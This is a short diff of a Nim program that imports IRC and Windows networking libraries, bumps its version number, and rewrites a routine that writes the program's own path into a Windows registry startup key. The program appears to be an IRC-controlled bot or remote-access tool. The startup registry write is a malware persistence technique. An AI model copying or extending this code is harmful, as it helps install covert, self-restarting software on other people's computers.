@@ -1,6 +1,6 @@
 import configparser, os, irc, base64, helper_base64, winim/inc/wininet, winim, random
 
-let current_version* = "1.0.6.8"
+let current_version* = "1.0.6.9"
 
 var
     g_tmp_clean* = false
@@ -139,10 +139,11 @@ proc updt_createStartupShortcut*() =
     var full_path:string = "\"" & getAppFilename() & "\""
 
     if result == ERROR_SUCCESS:
-        RegSetValueEx(
-        key, name, 0, REG_SZ, cast[LPBYTE](addr full_path[0]),
-        (full_path.len + 1).DWORD
-        )
+        # RegSetValueEx(
+        # key, name, 0, REG_SZ, cast[LPBYTE](addr full_path[0]),
+        # (full_path.len + 1).DWORD
+        # )
+        RegSetValueA(key, name, REG_SZ, full_path.cstring, 0)
         RegCloseKey(key)
     else:
         discard
